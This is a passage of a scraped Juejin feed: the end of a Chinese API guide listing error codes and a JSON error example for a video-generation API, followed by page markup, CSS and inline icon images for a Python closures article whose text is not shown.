<p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
<h2 data-id="heading-5">错误处理</h2>
<p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
<ul>
<li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
<li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
<li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
<li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
<li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
</ul>
<h3 data-id="heading-6">错误响应示例</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"error"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_error"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fetch failed"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-7">结论</h2>
<p>通过本文档，您已经了解了如何使用 Sora Videos Generation API 可通过输入提示词以及参考图片来生成视频。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 Python 中的闭包（Closure）：封装状态的函数式编程利器]]></title>    <link>https://juejin.cn/post/7589940210831491115</link>    <guid>https://juejin.cn/post/7589940210831491115</guid>    <pubDate>2026-01-02T07:59:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210831491115" data-draft-id="7589822564778229775" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 Python 中的闭包（Closure）：封装状态的函数式编程利器"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-02T07:59:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吃西红柿长大的番茄"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 Python 中的闭包（Closure）：封装状态的函数式编程利器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吃西红柿长大的番茄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:59:36.000Z" title="Fri Jan 02 2026 07:59:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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